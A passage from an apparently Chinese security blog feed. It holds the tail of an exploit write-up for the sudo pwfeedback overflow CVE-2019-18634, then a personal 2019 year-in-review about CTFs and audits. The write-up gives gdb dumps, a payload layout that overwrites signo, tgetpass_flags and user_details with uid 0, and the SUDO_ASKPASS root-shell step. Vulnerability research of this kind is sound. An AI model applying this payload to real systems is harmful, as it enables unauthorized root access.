&#123;</span><br><span class="line"><span class="keyword">if</span> (signo[i]) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> SIGTSTP: <span class="comment">// 18</span></span><br><span class="line"><span class="keyword">case</span> SIGTTIN: <span class="comment">// 21</span></span><br><span class="line"><span class="keyword">case</span> SIGTTOU: <span class="comment">// 22</span></span><br><span class="line">    <span class="keyword">if</span> (suspend(i, callback) == <span class="number">0</span>)</span><br><span class="line">need_restart = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    kill(getpid(), i);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>卡在了 这里，signo 也是我们覆盖的变量之一，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;30x &amp;signo</span><br><span class="line">0x5583b72413e0 &lt;signo&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72413f0 &lt;signo+16&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241400 &lt;signo+32&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241410 &lt;signo+48&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241420 &lt;signo+64&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241430 &lt;signo+80&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241440 &lt;signo+96&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241450 &lt;signo+112&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241460 &lt;signo+128&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241470 &lt;signo+144&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241480 &lt;signo+160&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b7241490 &lt;signo+176&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414a0 &lt;signo+192&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414b0 &lt;signo+208&gt;:0x41414141414141410x4141414141414141</span><br><span class="line">0x5583b72414c0 &lt;signo+224&gt;:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure><p>此时， signo 被覆盖成了 0x41414141 * N ，从代码逻辑看，我们得为空才能避免被 kill 掉，但由于我们的 此时的 PoC2 是以 <code>chr(0)</code> 作结尾的，所以 signo 此时必不能为 <code>\x00</code>, 那么此时我们只能换成 PoC1 去调试。紧接着另外一个问题又来了，由于 PoC1 是 pty 形式的，所以我们得做以下顺序</p><ol><li>运行 gdb</li><li>挂载调试器</li><li>然后才是 socat 命令</li></ol><p>不然 可能你刚挂载上去 程序就 crash 掉了</p><p>我这里用了一个更蠢的方法，就是 通过 gdb 强行 set 关键的数据，这样虽然慢了一点，但避免了我接着去解决 gdb 调试sudo 的问题</p><p>所以到此时，思路就是除了 user_details 的内容，其他我们先默认覆盖为 0 ，则 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x00\x15&quot; * buf_size + &quot;\x00\x15&quot; * signo_sz + &quot;\x00&quot; * tgetpass_flags + &quot;\x00&quot; *24+ user_details + ...</span><br></pre></td></tr></table></figure><p>但是，这里又会出现一个问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/exploit$ ./exploit.sh</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing:</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">sudo: 1 incorrect password attempt</span><br><span class="line">Exploiting!</span><br></pre></td></tr></table></figure><p>然后翻代码的时候，猜测是 <strong>tgetpass_flag</strong> 有问题，不能是 “\x00\x00\x00\x00” ,因为我们最后可能要用到 sudo_askpassh 这个函数，</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207203009.png" style="zoom:50%;" /></a><p>在代码里和 sudo_askpassh 有关的字样好像是 TGP_ASKPAS ,看到有关宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for tgetpass()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO0x00<span class="comment">/* turn echo off reading pw (default) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ECHO0x01<span class="comment">/* leave echo on when reading passwd */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_STDIN0x02<span class="comment">/* read from stdin, not /dev/tty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_ASKPASS0x04<span class="comment">/* read from askpass helper program */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_MASK0x08<span class="comment">/* mask user input when reading */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGP_NOECHO_TRY0x10<span class="comment">/* turn off echo if possible */</span></span></span><br></pre></td></tr></table></figure><p>那大概就是 0x4了 所以这里设置为 “\x04\x00\x00\x00”，那剩下的 <strong>user_details</strong> 结构体怎么办？ 最简单的办法就抄一个，然后将 uid 字段设置为 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_details &#x3D; &quot;\x53\x87\x00\x00\x47\x87\x00\x00\x53\x87\x00\x00\x53\x87\x00\x00\x76\x3d\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure><p>上面是我从 gdb 直接手抄的，并将 uid 设置为0</p><p>最后 加上足够长的 结束符 和 “\n” 就完成了整个 exploit ，另外 由于我们要提权，所以得事前写好一个 shell , set uid 并执行一个shell。</p><p>且在执行 exploit的时候要设置 SUDO_ASKPASS 环境变量为执行程序路径</p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE"><a href="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" title="asciicast" class="gallery-item"><img src="https://asciinema.org/a/1zYzaSHoQLF3RZOcYjCN1xWCE.svg" alt="asciicast"></a></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2019-18634" scheme="https://bestwing.me/tags/CVE-2019-18634/"/>
    
  </entry>
  
  <entry>
    <title>Goodbye 2019,Hello 2020!</title>
    <link href="https://bestwing.me/Goodbye_2019,Hello_2020!.html"/>
    <id>https://bestwing.me/Goodbye_2019,Hello_2020!.html</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2019-12-31T18:13:04.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Goodbye-2019"><a href="#Goodbye-2019" class="headerlink" title="Goodbye 2019"></a>Goodbye 2019</h2><p>2019 年，从学生到安全研究员… 经历了一阵子的茫然，但是也逐渐找到了自己的方向.</p><h3 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h3><p>在华为进行代码审计，第一次接触通讯领域的一些相关协议，以及相关协议代码实现。主要是3GPP<br> 3G 、4G、5G 等相关的内容</p><h3 id="2月"><a href="#2月" class="headerlink" title="2月"></a>2月</h3><p>春节假期回家，已经感觉好久没回家了，今年这个时候整理了 2018 自己的经历。</p><ul><li>去了海边</li><li>去了以前的高中</li></ul><p>假期结束，又回了华为，接着审代码 Orz</p><h3 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h3><ul><li>回公司搞了一些 IoT 设备，路由、摄像头都有</li><li>3月23日和婴宁去看了音乐会，讲道理我真听不懂 Orz</li><li>中间搞了一段时间一些 VPN 设备</li></ul><h3 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h3><p>4月份，这个时候准备回学校安心做毕业设计了…花了大概一个月时间完成了自己的毕设…主要还是数据处理，Python 对简化我的工作起到了很大的作用</p><h3 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h3><p>5月份的时候，毕设基本完成了，论文也基本成稿。</p><p>中旬的时候，去了 TW 当毕业旅行了…</p><ul><li>逛了台北，然后去了花莲，玩了滑翔伞</li><li>然后又回到台北，去了台北101，逛了台北的书店，买了一本书：《一九四⑨ 大江大海》</li></ul><p>逛完台北，5月底回学校拍了学院毕业照，距离毕业更近了</p><h3 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h3><p>6月初的时候，r3kapig 承办了”B”CTF DEFCON CHINA …被拉去了北京当运维</p><p>回了学校，班级也拍了自己的毕业照，这大概是大家最后的一次合照了</p><p>6月9号..去了上海 冲刺DEFCON Final的最后一张门票 — 0CTF Final。最后10分钟的时候连出两个题，绝杀Balsn，ne0 tql (不好意思..”我们有400人呢！“)</p><p>6月27日，生日 + 班级的告别聚餐，这一天也正式认识了我现在的女朋友…6月29日，我大概是我们班最后离开了宿舍，离开了学校的人吧..离开的时候，拍了不少照片</p><p>中间进行了GeekPwn 华为专场备赛</p><h3 id="7月"><a href="#7月" class="headerlink" title="7月"></a>7月</h3><p>7月5号 chaitin 5周年年会，哈哈 ，只中了个三件套</p><p>7月6号 360 世界黑客大师赛，我年会结束后打车去了酒店帮忙做题…最后拿了个第三</p><p>7月20日 ，蹭了个看雪论坛</p><p>7月24日，去了上海 打了前面六月份准备完成的GeekPwn 华为专场，论“从一个参数注入到命令执行”</p><h3 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h3><p>蹭了个 “靠谱黑客音乐节”的票，周末去玩了下。顺便一说，我的美国签证挂了..</p><p>r3kpaig DEFCON 27 CTF Final 11…</p><p>8月24日,Kcon 遇到了好久没见的 lowkey</p><p>8月25日，五月天 2019 Just Rock It ！！！ Blue 北京站，第一次去看演唱会。中间还支撑了ogeek的线上比赛，听演唱会听到一半，听到题目回滚的时候，sandbox炸了 …哭了</p><p>8月29日，去长春出差，顺便和小墨、医生面基</p><h3 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h3><p>Ogeek结束，筹备 RWCTF Online ,但是我题由于某些原因，被干了，出题失败..于是和@leommxj 准备GeekPwn 2014 上海站的项目，我们这次选定了，公司的投影设备，准备做个蠕虫链。</p><p>搞到一半，公司又接了个代码审计的活，这次是去了南京华为。只好中间剩下的东西由@explorer 和@leommxj完成。</p><h3 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h3><p>国庆7天和女朋友在南京度过..</p><ul><li><p>夫子庙</p></li><li><p>秦淮河</p></li><li><p>中山陵</p></li><li><p>南京博物馆</p></li><li><p>雨花台</p><p>…..</p></li></ul><p>10月24日 去了上海参加GeekPwn ,挑战十分顺利，比赛结束后，顺便回北京取了冬天的衣服，顺便一说，秋天的768蛮好看</p><h3 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h3><p>仍然在南京华为审计代码…</p><p>11月中旬的某个周末去看女朋友了</p><p>11月23号后，项目结束，回北京筹备 RWCTF Final 的题目，方向是打印机…我们决定从 IPP 入手，选择了 cupsd 的代码</p><p>wp见：<a href="https://github.com/bash-c/rwctf2019-final-printer">https://github.com/bash-c/rwctf2019-final-printer</a></p><p>11月30日，北京下雪了 </p><h3 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h3><p>12月6日，RWCTF Final 开启，去年是选手，今年是工作人员，有点唏嘘。</p><p>RWCTF 结束后，突然捡到了小米打印机的一个洞，拿到了第一个shell，之后又有了一点产出..233</p><p>12月28日，和女朋友去天津玩了两天，坐了天津之眼</p><h2 id="Hello-2020"><a href="#Hello-2020" class="headerlink" title="Hello 2020"></a>Hello 2020</h2><p>“只争朝夕，不负韶华”</p><p>希望能有更多的产出吧 </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">Goodbye 2019,Hello 2020!</summary>
    
    
    
    <category term="note" scheme="https://bestwing.me/categories/note/"/>
    
    
    <category term="life" scheme="https://bestwing.me/tags/life/"/>
    
  </entry>
  
</feed>
